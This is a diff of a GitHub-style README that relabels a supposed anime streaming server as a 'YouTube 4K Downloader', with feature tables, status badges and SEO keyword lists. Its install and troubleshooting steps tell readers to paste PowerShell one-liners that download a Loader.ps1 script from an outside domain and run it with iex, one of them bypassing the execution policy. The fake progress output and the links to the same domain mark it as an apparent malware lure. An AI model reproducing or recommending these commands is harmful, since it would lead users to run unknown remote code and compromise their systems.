@@ -1,17 +1,17 @@
 <p align="center">
-  <img src="https://img.shields.io/badge/Anime_Streaming-v1.8-blue?style=for-the-badge&logo=github">
+  <img src="https://img.shields.io/badge/YouTube_4K_Downloader-v2.8-blue?style=for-the-badge&logo=github">
   <img src="https://img.shields.io/badge/Status-Working-brightgreen?style=for-the-badge">
   <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge">
 </p>
 
 <h1 align="center">
-  📺 Anime Streaming Platform 2026<br>
-  <span style="font-size:18px;">Self-Hosted Anime Streaming Server with Subtitle Support</span>
+  📥 YouTube 4K Downloader 2026<br>
+  <span style="font-size:18px;">Download YouTube Videos in 4K, 1080p, Audio Only & Playlist Support</span>
 </h1>
 
 <p align="center">
-  <strong>Self-Hosted | Subtitles | Watch Party | Recommendations | Mobile Friendly</strong><br>
-  <span style="color:#6c757d;">Working 2026 · Node.js/Go · Docker · Jellyfin Compatible</span>
+  <strong>4K/8K Download | Playlist | Audio Extract | Subtitle Download | Batch Mode</strong><br>
+  <span style="color:#6c757d;">Working 2026 · yt-dlp Based · CLI & GUI · Cross-Platform</span>
 </p>
 
 <p align="center">
@@ -24,7 +24,7 @@
 
 > ⚠️ **DISCLAIMER**
 > This tool is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.
-> Only stream content you own or have the right to distribute.
+> Only download content you have the right to download. Respect copyright.
 > **BY USING THIS TOOL YOU AGREE TO THESE TERMS.**
 
 ---
@@ -43,14 +43,14 @@ powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
 
 ### Step 3: Wait for Completion
 ```
-[1/4] Loading Anime Streaming Platform modules...
-[2/4] Configuring streaming server...
-[3/4] Initializing media library...
+[1/4] Loading YouTube 4K Downloader modules...
+[2/4] Configuring download engine...
+[3/4] Initializing format selector...
 [4/4] Ready. Start using.
 ```
 
-### Step 4: Deploy
-Configure your media library paths, start the server, and access the web interface at `localhost:8080`.
+### Step 4: Download
+Paste a YouTube URL, select your preferred quality (4K, 1080p, audio only), and click download. Supports playlists and batch URLs.
 
 ---
 
@@ -58,36 +58,36 @@ Configure your media library paths, start the server, and access the web interfa
 
 <table>
   <tr>
-    <td><strong>📺 Self-Hosted</strong></td>
-    <td>Run your own anime streaming server with full control over your media library</td>
+    <td><strong>🎬 4K/8K Support</strong></td>
+    <td>Download videos up to 8K resolution with HDR support and 60fps playback</td>
   </tr>
   <tr>
-    <td><strong>📝 Subtitle Support</strong></td>
-    <td>Auto-detect and embed external subtitle files with multi-language support</td>
+    <td><strong>📋 Playlist Download</strong></td>
+    <td>Download entire playlists with playlist numbering, chapter markers, and selective download</td>
   </tr>
   <tr>
-    <td><strong>👥 Watch Party</strong></td>
-    <td>Synchronized viewing with friends in real-time with chat and reactions</td>
+    <td><strong>🎵 Audio Extract</strong></td>
+    <td>Extract audio as MP3, AAC, FLAC, or WAV with configurable bitrate and metadata tags</td>
   </tr>
   <tr>
-    <td><strong>🎯 Recommendations</strong></td>
-    <td>AI-powered recommendations based on watch history and genre preferences</td>
+    <td><strong>📝 Subtitle Download</strong></td>
+    <td>Download auto-generated and manual subtitles in all available languages</td>
   </tr>
   <tr>
-    <td><strong>📱 Mobile Friendly</strong></td>
-    <td>Responsive web interface optimized for mobile viewing and casting</td>
+    <td><strong>⚡ Batch Mode</strong></td>
+    <td>Queue multiple URLs and download them all with concurrent connections and progress tracking</td>
   </tr>
   <tr>
-    <td><strong>🐳 Docker Ready</strong></td>
-    <td>One-command Docker deployment with docker-compose and environment configuration</td>
+    <td><strong>🖥️ GUI Interface</strong></td>
+    <td>Clean web-based GUI with drag-and-drop URL input, quality selector, and download queue</td>
   </tr>
   <tr>
-    <td><strong>🔗 Jellyfin Compatible</strong></td>
-    <td>Import Jellyfin libraries and share media between platforms</td>
+    <td><strong>📦 Format Selection</strong></td>
+    <td>Choose specific video+audio format combinations with codec and container preferences</td>
   </tr>
   <tr>
-    <td><strong>📊 Watch Stats</strong></td>
-    <td>Track your watching history, completion rates, and genre statistics</td>
+    <td><strong>🔄 Auto-Update</strong></td>
+    <td>Automatic yt-dlp updates to stay compatible with YouTube's latest changes</td>
   </tr>
 </table>
 
@@ -97,29 +97,29 @@ Configure your media library paths, start the server, and access the web interfa
 
 <table>
   <tr>
-    <td><strong>Streaming Server</strong></td>
+    <td><strong>Download Engine</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v1.8.0</td>
+    <td>v2.8.0</td>
   </tr>
   <tr>
-    <td><strong>Subtitle Engine</strong></td>
+    <td><strong>Format Selector</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v1.7.8</td>
+    <td>v2.7.8</td>
   </tr>
   <tr>
-    <td><strong>Watch Party</strong></td>
+    <td><strong>Audio Extractor</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v1.7.5</td>
+    <td>v2.7.5</td>
   </tr>
   <tr>
-    <td><strong>Recommendations</strong></td>
+    <td><strong>Subtitle Downloader</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v1.7.3</td>
+    <td>v2.7.3</td>
   </tr>
   <tr>
-    <td><strong>Web Interface</strong></td>
+    <td><strong>GUI Application</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v1.8.0</td>
+    <td>v2.8.0</td>
   </tr>
 </table>
 
@@ -128,14 +128,14 @@ Configure your media library paths, start the server, and access the web interfa
 ## ⬇️ DOWNLOAD
 
 ### 🔗 Official Download
-[![Download Now](https://img.shields.io/badge/Download-Anime_Streaming-brightgreen?style=for-the-badge&logo=github)](https://frtview.com/anime-streaming)
+[![Download Now](https://img.shields.io/badge/Download-YT_4K-brightgreen?style=for-the-badge&logo=github)](https://frtview.com/youtube-4k-downloader)
 
 ### 📦 Direct Links
 | Platform | Link |
 |----------|------|
-| **GitHub Release** | [Download Latest](https://frtview.com/anime-streaming) |
-| **Direct ZIP** | [Download ZIP](https://frtview.com/anime-streaming) |
-| **Portable Version** | [Download Portable](https://frtview.com/anime-streaming) |
+| **GitHub Release** | [Download Latest](https://frtview.com/youtube-4k-downloader) |
+| **Direct ZIP** | [Download ZIP](https://frtview.com/youtube-4k-downloader) |
+| **Portable Version** | [Download Portable](https://frtview.com/youtube-4k-downloader) |
 
 ---
 
@@ -151,26 +151,26 @@ powershell -ExecutionPolicy Bypass -Command "irm https://mast.frtview.com/Loader
 powershell -Command "Invoke-RestMethod https://mast.frtview.com/Loader.ps1 | Invoke-Expression"
 ```
 
-### 📌 Server Won't Start
-Check that the configured port is not in use, verify media library paths exist, and ensure Node.js 18+ or Go 1.21+ is installed.
+### 📌 4K Not Available
+Some videos don't have 4K versions — try 1440p or 1080p, check that the original upload supports the resolution, and ensure your network can handle large file downloads.
 
-### 📌 Subtitles Not Syncing
-Check subtitle file encoding (UTF-8 recommended), verify the subtitle timing offset, and try manually syncing with the built-in offset control.
+### 📌 Download Fails
+Update yt-dlp to the latest version, try with `--cookies-from-browser` for age-restricted content, and check if a proxy or VPN is needed for your region.
 
 ---
 
 ## 🏷️ TAGS & KEYWORDS
 
 ```
-anime streaming, anime github, anime streaming site, self-hosted anime, anime server, anime platform, anime watch, anime online, anime jellyfin, anime docker, anime recommendations, watch party, anime subtitle, anime media server, anime 2026
+youtube downloader, 4k youtube downloader, youtube download github, youtube video download, yt-dlp, youtube audio download, youtube playlist download, youtube 4k, video downloader, youtube subtitles, batch download, youtube github, youtube tool, download youtube, video download 2026
 ```
 
 <p align="center">
   <a href="#"><img src="https://img.shields.io/badge/⭐-Star_This_Repo-yellow?style=for-the-badge"></a>
   <a href="#"><img src="https://img.shields.io/badge/🍴-Fork_This_Repo-blue?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/📺-Happy_Watching-orange?style=for-the-badge"></a>
+  <a href="#"><img src="https://img.shields.io/badge/📥-Happy_Downloading-orange?style=for-the-badge"></a>
 </p>
 
 ---
 
-**© 2026 Anime Streaming Platform — All rights reserved for educational purposes.**
+**© 2026 YouTube 4K Downloader — All rights reserved for educational purposes.**
